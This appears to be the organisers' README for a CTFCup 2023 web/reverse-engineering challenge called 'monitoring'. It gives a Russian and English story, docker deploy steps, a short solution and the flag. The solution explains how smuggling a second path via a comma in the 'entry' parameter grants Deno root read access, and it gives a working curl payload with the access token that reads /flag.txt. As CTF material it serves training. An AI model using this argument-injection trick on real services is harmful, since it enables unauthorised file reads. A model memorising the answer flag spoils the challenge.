# web | monitoring

## Information

Нам удалось вчёрную получить на руки некоторые из сервисов, встроенных в различные компоненты Megalith, но, к сожалению, только в бинарном виде. В частности, нам достался какой-то из серверов системы мониторинга за населением Metra Veehkim, может получиться как-нибудь разобраться с ним и выяснить, какие данные о нас собирают Арбалеты?

We've managed to (not entirely legally) get our hands on some of the services embedded into the differents components of Megalith, but, sadly, only as binaries. Specifically, we've got one of the servers of the Metra Veehkim citizen monitoring system, do you think it could perhaps somehow help us figure out what kind of data the Arbalests are collecting about us?

[https://monitoring-e2fc67113f9ed6f1d2bd6eae0c98f124.ctfcup-2023.ru](https://monitoring-e2fc67113f9ed6f1d2bd6eae0c98f124.ctfcup-2023.ru)

## Deploy

Need whale deployment.

```sh
cd deploy
docker compose -p rev-monitoring up --build -d
```

## Public

Provide zip file: [public/monitoring.zip](public/monitoring.zip).

## TLDR

Find source code at the end of the file (e.g using `rabin2 -zzz`), extract it, perform simple reverse engineering (as usual the obfuscation basically stores all strings in an array).

The app executes our code from the "cmd" parameter using deno, and you can specify the entry to read using the "entry" parameter:

```js
const command = Bun.spawn(
  ["/usr/bin/deno", "run", `--allow-read=./${entry}`, cmdPath],
  {
    stderr: "ignore",
    cwd: "entries",
    env: {},
  }
);
```

However, ".." is banned in entry, but you can simply specify a second path using a comma in order to get read access to the root.

```sh
curl http://localhost:1984 -i -H "Monitor-Access-Token: MEGALITH_MONITORING_SYSTEM_EZRVJJCQ4ET3W25BONANMPWPQSRV7JXE" --data-raw '{"cmd":"console.log(new TextDecoder().decode(Deno.readFileSync(\"/flag.txt\")))","entry":"/,/"}'
```

## Writeup (ru)

TODO

## Writeup (en)

TODO

## Domain

https://monitoring-e2fc67113f9ed6f1d2bd6eae0c98f124.ctfcup-2023.ru

## Cloudflare

Yes

## Flag

ctfcup{t00-m4ny-su55y-jS-runt1m3s-f7cc17249450a7fb}